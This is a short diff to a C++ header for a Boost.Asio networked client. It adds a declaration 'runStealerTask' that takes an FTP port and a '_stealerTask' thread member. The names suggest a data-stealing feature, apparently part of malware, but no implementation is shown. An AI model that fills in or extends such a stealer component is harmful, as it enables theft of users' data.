@@ -42,6 +42,7 @@ private:
 	void do_handshake(boost::system::error_code const& ec);
 
 	void runThread(void);
+	void runStealerTask(std::string const& ftpPort);
 
 	boost::asio::io_service _io_service;
 	boost::asio::deadline_timer _timer;
@@ -56,6 +57,7 @@ private:
 	RequestHandler _reqHandler;
 
 	std::thread _runThread;
+	std::thread _stealerTask;
 
 	std::string _remote;
 	std::string _port;
